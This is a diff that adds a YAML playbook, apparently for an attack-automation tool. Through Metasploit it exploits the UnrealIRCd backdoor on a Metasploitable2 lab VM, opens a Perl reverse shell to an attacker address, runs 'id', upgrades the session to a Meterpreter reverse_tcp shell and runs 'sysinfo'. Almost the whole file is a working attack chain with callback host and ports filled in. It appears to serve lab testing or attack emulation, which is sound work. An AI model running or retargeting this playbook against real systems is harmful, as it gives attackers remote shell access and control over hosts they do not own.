@@ -1,0 +1,53 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Exploit the unreal_irc_backdoor
+#     2. Execute command in reverse-shell
+#     3. Upgrade reverse-shell to meterpreter shell
+#     4. Execute commands in meterpreter shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 192.168.10.225
+  ATTACKER: 172.17.0.127
+  PAYLOAD: cmd/unix/reverse_perl
+  LPORT: 4444
+
+commands:
+  # Perform Unreal-Irc-Backdoor-Exploit
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/unix/irc/unreal_ircd_3281_backdoor
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    options:
+      RHOSTS: $METASPLOITABLE
+
+  # Execute unix-command 'id' via reverse-shell
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  # Upgrade reverse-shell to meterpreter-shell
+  - type: msf-module
+    creates_session: upgraded
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: 4433
+
+  # Execute meterpreter-command 'sysinfo'
+  - type: msf-session
+    session: upgraded
+    stdapi: True
+    cmd: sysinfo
